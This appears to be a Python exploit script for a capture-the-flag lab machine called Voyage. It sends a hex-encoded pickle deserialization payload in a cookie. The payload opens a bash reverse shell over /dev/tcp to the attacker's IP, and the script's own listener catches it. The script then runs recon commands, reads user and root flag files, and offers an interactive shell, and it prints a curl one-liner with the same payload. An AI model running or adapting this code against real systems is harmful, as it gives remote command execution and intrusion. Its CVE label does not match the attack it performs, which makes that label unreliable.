#!/usr/bin/env python3
"""
CVE-2023-23752 - Voyage Hunt One-Click Exploit
Automatically gets both user and root flags!
"""

import requests
import socket
import threading
import time
import sys
import re

TARGET = "http://10.82.166.188"
ATTACKER_IP = "10.2.36.59"
ATTACKER_PORT = 4444

# Reverse Shell Payload
PAYLOAD = "80049568000000000000007d94288c0475736572948c026e74948c0673797374656d9493948c3262617368202d63202262617368202d69203e26202f6465762f7463702f31302e322e33362e35392f3434343420303e26312294859452948c07726576656e7565948c0639393939393994752e"

# Global variables
shell_connection = None
shell_output = ""
shell_ready = False

def print_banner():
    print("\n" + "="*70)
    print("CVE-2023-23752 - Voyage Hunt One-Click Exploit")
    print("="*70 + "\n")

def print_status(status, message):
    if status == "success":
        print(f"✓ {message}")
    elif status == "info":
        print(f"• {message}")
    elif status == "error":
        print(f"✗ {message}")
    elif status == "wait":
        print(f"⏳ {message}")

def start_listener():
    """Start socket listener for reverse shell"""
    global shell_connection, shell_ready
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', ATTACKER_PORT))
        sock.listen(1)
        sock.settimeout(30)
        
        print_status("info", f"Listener started on 0.0.0.0:{ATTACKER_PORT}")
        
        try:
            shell_connection, addr = sock.accept()
            print_status("success", f"Shell connection from {addr[0]}:{addr[1]}")
            shell_ready = True
            
            # Read output in background
            read_shell_output()
            
        except socket.timeout:
            print_status("error", "No connection received (timeout)")
        finally:
            sock.close()
            
    except Exception as e:
        print_status("error", f"Listener error: {e}")

def read_shell_output():
    """Read from shell connection"""
    global shell_connection, shell_output
    
    try:
        while shell_connection:
            data = shell_connection.recv(4096)
            if not data:
                break
            shell_output += data.decode('utf-8', errors='ignore')
    except:
        pass

def send_command(cmd):
    """Send command to shell and get output"""
    global shell_connection, shell_output
    
    if not shell_connection:
        return None
    
    try:
        shell_output = ""
        shell_connection.send((cmd + "\n").encode())
        time.sleep(1.5)  # Wait for response
        return shell_output
    except:
        return None

def send_exploit():
    """Send the Pickle RCE exploit"""
    try:
        print_status("info", "Sending exploit to target...")
        
        session = requests.Session()
        session.cookies.set('userData', PAYLOAD)
        
        response = session.get(TARGET, timeout=5)
        print_status("success", f"Exploit sent (HTTP {response.status_code})")
        return True
        
    except Exception as e:
        print_status("error", f"Failed to send exploit: {e}")
        return False

def extract_flags(output):
    """Extract flags from shell output"""
    flags = {}
    
    # Look for user flag
    if '/home' in output and 'flag' in output.lower():
        lines = output.split('\n')
        for line in lines:
            if 'flag' in line.lower() or (len(line) > 20 and not line.startswith('/')):
                if line.strip() and not 'cat' in line and not 'find' in line:
                    flags['user'] = line.strip()
    
    # Look for root flag
    if 'root.txt' in output:
        lines = output.split('\n')
        for i, line in enumerate(lines):
            if 'root.txt' in line and i+1 < len(lines):
                flags['root'] = lines[i+1].strip()
            elif line.strip() and len(line) > 20 and not line.startswith('/') and not 'find' in line:
                flags['root'] = line.strip()
    
    return flags

def main():
    print_banner()
    
    # Step 1: Check connectivity
    print_status("wait", "Step 1: Checking target connectivity...")
    try:
        requests.get(TARGET, timeout=5)
        print_status("success", "Target is reachable")
    except:
        print_status("error", "Cannot reach target!")
        return
    
    # Step 2: Check if nc is available and start listener
    print_status("wait", "Step 2: Checking for netcat listener...")
    import subprocess
    import os
    
    # Check if we're on Linux/Mac with nc available
    try:
        subprocess.run(['which', 'nc'], capture_output=True, check=True)
        print_status("success", "netcat found - starting listener in background...")
        listener_thread = threading.Thread(target=start_listener, daemon=True)
        listener_thread.start()
        time.sleep(1)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print_status("error", "netcat not found!")
        print("\n" + "="*70)
        print("⚠️  MANUAL SETUP REQUIRED")
        print("="*70)
        print("\n[STEP 1] Open a NEW terminal and run THIS command FIRST:")
        print(f"\n  nc -lvnp {ATTACKER_PORT}\n")
        print("Leave that terminal running!\n")
        print("[STEP 2] Then come back to this script and press ENTER to continue...")
        print("="*70 + "\n")
        input("Press ENTER once you've started the listener...\n")
        listener_thread = threading.Thread(target=start_listener, daemon=True)
        listener_thread.start()
        time.sleep(1)
    
    # Step 3: Send exploit
    print_status("wait", "Step 3: Sending exploit...")
    if not send_exploit():
        return
    
    # Step 4: Wait for shell
    print_status("wait", "Step 4: Waiting for reverse shell connection...")
    max_wait = 20
    waited = 0
    while not shell_ready and waited < max_wait:
        time.sleep(0.5)
        waited += 0.5
    
    if not shell_ready:
        print_status("error", "No shell connection received!")
        print_status("info", "Try manual method:")
        print(f"\n  Listener: nc -lvnp {ATTACKER_PORT}")
        print(f"  Exploit: curl -b 'userData={PAYLOAD}' {TARGET}/\n")
        return
    
    time.sleep(1)
    
    # Step 5: Run recon commands
    print_status("wait", "Step 5: Gathering information...")
    
    info = {}
    
    # Who am I
    output = send_command("whoami")
    if output:
        info['user'] = output.strip().split('\n')[-1]
        print_status("success", f"Current user: {info['user']}")
    
    # ID
    output = send_command("id")
    if output:
        info['id'] = output.strip().split('\n')[-1]
        print_status("info", f"ID: {info['id']}")
    
    # Check if Docker
    output = send_command("cat /proc/1/cgroup | grep docker")
    if output and output.strip():
        print_status("info", "⚠️  Running in Docker container!")
        info['container'] = True
    else:
        print_status("info", "Not in container")
    
    # Step 6: Get USER FLAG
    print_status("wait", "Step 6: Searching for user flag...")
    output = send_command("cat /home/*/user.txt")
    
    if output and output.strip() and not 'cannot' in output.lower():
        user_flag = output.strip().split('\n')[-1]
        print_status("success", "USER FLAG FOUND!")
        print("\n" + "="*70)
        print(f"USER FLAG: {user_flag}")
        print("="*70 + "\n")
    else:
        print_status("error", "User flag not found in standard location")
    
    # Step 7: Get ROOT FLAG
    print_status("wait", "Step 7: Searching for root flag...")
    
    # Try common locations
    root_flag = None
    locations = [
        "cat /root/root.txt",
        "cat /mnt/*/root.txt",
        "cat /host/root/root.txt",
        "find / -name 'root.txt' -type f 2>/dev/null | head -1 | xargs cat"
    ]
    
    for cmd in locations:
        output = send_command(cmd)
        if output and output.strip() and 'cannot' not in output.lower() and not 'find:' in output:
            lines = output.strip().split('\n')
            root_flag = lines[-1]
            if len(root_flag) > 5 and not root_flag.startswith('/'):
                break
    
    if root_flag and len(root_flag) > 5:
        print_status("success", "ROOT FLAG FOUND!")
        print("\n" + "="*70)
        print(f"ROOT FLAG: {root_flag}")
        print("="*70 + "\n")
    else:
        print_status("info", "Root flag not yet found")
        print_status("info", "You may need privilege escalation or the flag might be at:")
        print("       /mnt/root/root.txt")
        print("       /host/root/root.txt")
    
    # Step 8: Summary
    print("\n" + "="*70)
    print("EXPLOITATION SUMMARY")
    print("="*70)
    print(f"Target: {TARGET}")
    print(f"User: {info.get('user', 'Unknown')}")
    print(f"Container: {'Yes (Docker)' if info.get('container') else 'No'}")
    
    if user_flag:
        print(f"User Flag: {user_flag}")
    
    if root_flag:
        print(f"Root Flag: {root_flag}")
    
    print("\n" + "="*70)
    
    # Step 9: Interactive shell (optional)
    print_status("info", "Shell still active - type commands or 'exit' to quit:")
    try:
        while True:
            cmd = input("\nShell> ").strip()
            if cmd.lower() == 'exit':
                break
            if cmd:
                output = send_command(cmd)
                if output:
                    print(output)
    except KeyboardInterrupt:
        print("\n\nClosing...")
    except:
        pass
    
    print_status("success", "Done!")

if __name__ == "__main__":
    main()
